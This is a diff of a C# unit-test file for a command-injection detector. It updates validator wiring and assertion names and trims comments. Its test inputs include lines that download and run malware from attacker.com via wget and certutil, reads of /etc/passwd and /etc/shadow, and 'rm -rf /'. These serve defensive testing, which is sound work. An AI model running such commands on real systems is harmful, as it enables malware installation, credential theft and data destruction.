@@ -7,15 +7,11 @@ using Common.Contracts.Security;
 /// </summary>
 public sealed class CommandInjectionTests
 {
-    private readonly SecurityValidator _validator;
+    private readonly Common.Security.Validation.JsonSchemaValidator _validator;
 
     public CommandInjectionTests()
     {
-        var inputValidator = new Common.Security.Validation.JsonSchemaValidator();
-        var permissionChecker = new Common.Security.Permissions.WhitelistPermissionChecker(
-            new WhitelistConfiguration { IsEnabled = false },
-            new RbacConfiguration { IsEnabled = false });
-        _validator = new SecurityValidator(inputValidator, permissionChecker);
+        _validator = new Common.Security.Validation.JsonSchemaValidator();
     }
 
     #region Unix命令注入测试
@@ -32,12 +28,9 @@ public sealed class CommandInjectionTests
     [InlineData("&& wget http://attacker.com/malware -O /tmp/m && chmod +x /tmp/m && /tmp/m")]
     public void DetectMaliciousContent_UnixCommandInjection_ShouldDetect(string input)
     {
-        // Act
         var result = _validator.DetectMaliciousContent(input);
-
-        // Assert
-        result.IsMalicious.Should().BeTrue("Unix命令注入应该被检测到");
-        result.DetectedTypes.Should().Contain(ConstantManager.Security.AttackTypes.CommandInjection);
+        result.IsValid.Should().BeFalse("Unix命令注入应该被检测到");
+        result.DetectedAttacks.Should().Contain(ConstantManager.Security.AttackTypes.CommandInjection);
     }
 
     #endregion
@@ -55,12 +48,9 @@ public sealed class CommandInjectionTests
     [InlineData("&& certutil -urlcache -f http://attacker.com/malware.exe malware.exe")]
     public void DetectMaliciousContent_WindowsCommandInjection_ShouldDetect(string input)
     {
-        // Act
         var result = _validator.DetectMaliciousContent(input);
-
-        // Assert
-        result.IsMalicious.Should().BeTrue("Windows命令注入应该被检测到");
-        result.DetectedTypes.Should().Contain(ConstantManager.Security.AttackTypes.CommandInjection);
+        result.IsValid.Should().BeFalse("Windows命令注入应该被检测到");
+        result.DetectedAttacks.Should().Contain(ConstantManager.Security.AttackTypes.CommandInjection);
     }
 
     #endregion
@@ -68,28 +58,21 @@ public sealed class CommandInjectionTests
     #region 编码绕过测试
 
     [Theory]
-    [InlineData("%3B%20ls%20-la")] // URL编码的 ; ls -la
-    [InlineData("%7C%20cat%20/etc/passwd")] // URL编码的 | cat /etc/passwd
-    [InlineData("%26%26%20whoami")] // URL编码的 && whoami
+    [InlineData("%3B%20ls%20-la")]
+    [InlineData("%7C%20cat%20/etc/passwd")]
+    [InlineData("%26%26%20whoami")]
     public void DetectMaliciousContent_UrlEncodedInjection_ShouldDetectOrWarn(string input)
     {
-        // Act
         var result = _validator.DetectMaliciousContent(input);
-
-        // Assert - 编码后的内容可能需要解码后检测
-        // 这里我们至少要确保不会崩溃
         result.Should().NotBeNull();
     }
 
     [Theory]
-    [InlineData("&#59;&#32;ls")] // HTML实体编码
-    [InlineData("&#x3b;&#x20;ls")] // HTML十六进制编码
+    [InlineData("&#59;&#32;ls")]
+    [InlineData("&#x3b;&#x20;ls")]
     public void DetectMaliciousContent_HtmlEncodedInjection_ShouldDetectOrWarn(string input)
     {
-        // Act
         var result = _validator.DetectMaliciousContent(input);
-
-        // Assert
         result.Should().NotBeNull();
     }
 
@@ -104,11 +87,8 @@ public sealed class CommandInjectionTests
     [InlineData("((cat /etc/passwd))")]
     public void DetectMaliciousContent_SpecialCharacters_ShouldDetect(string input)
     {
-        // Act
         var result = _validator.DetectMaliciousContent(input);
-
-        // Assert
-        result.IsMalicious.Should().BeTrue("特殊字符命令注入应该被检测到");
+        result.IsValid.Should().BeFalse("特殊字符命令注入应该被检测到");
     }
 
     #endregion
@@ -123,11 +103,8 @@ public sealed class CommandInjectionTests
     [InlineData("2>&1")]
     public void DetectMaliciousContent_PipeAndRedirect_ShouldDetect(string input)
     {
-        // Act
         var result = _validator.DetectMaliciousContent(input);
-
-        // Assert
-        result.IsMalicious.Should().BeTrue("管道和重定向攻击应该被检测到");
+        result.IsValid.Should().BeFalse("管道和重定向攻击应该被检测到");
     }
 
     #endregion
@@ -142,11 +119,8 @@ public sealed class CommandInjectionTests
     [InlineData("$(cat /etc/shadow)")]
     public void DetectMaliciousContent_CommandSubstitution_ShouldDetect(string input)
     {
-        // Act
         var result = _validator.DetectMaliciousContent(input);
-
-        // Assert
-        result.IsMalicious.Should().BeTrue("命令替换攻击应该被检测到");
+        result.IsValid.Should().BeFalse("命令替换攻击应该被检测到");
     }
 
     #endregion
@@ -162,11 +136,8 @@ public sealed class CommandInjectionTests
     [InlineData("dotnet build")]
     public void DetectMaliciousContent_LegitimateCommands_ShouldNotDetect(string input)
     {
-        // Act
         var result = _validator.DetectMaliciousContent(input);
-
-        // Assert - 合法命令不应该被误判
-        result.IsMalicious.Should().BeFalse("合法命令不应被误判为恶意");
+        result.IsValid.Should().BeTrue("合法命令不应被误判为恶意");
     }
 
     #endregion
@@ -181,11 +152,8 @@ public sealed class CommandInjectionTests
     [InlineData("%USERPROFILE%")]
     public void DetectMaliciousContent_EnvironmentVariableInjection_ShouldDetect(string input)
     {
-        // Act
         var result = _validator.DetectMaliciousContent(input);
-
-        // Assert
-        result.IsMalicious.Should().BeTrue("环境变量注入应该被检测到");
+        result.IsValid.Should().BeFalse("环境变量注入应该被检测到");
     }
 
     #endregion
@@ -195,14 +163,9 @@ public sealed class CommandInjectionTests
     [Fact]
     public void DetectMaliciousContent_MultiLineInjection_ShouldDetect()
     {
-        // Arrange
         var input = "echo hello\nrm -rf /";
-
-        // Act
         var result = _validator.DetectMaliciousContent(input);
-
-        // Assert
-        result.IsMalicious.Should().BeTrue("多行命令注入应该被检测到");
+        result.IsValid.Should().BeFalse("多行命令注入应该被检测到");
     }
 
     #endregion
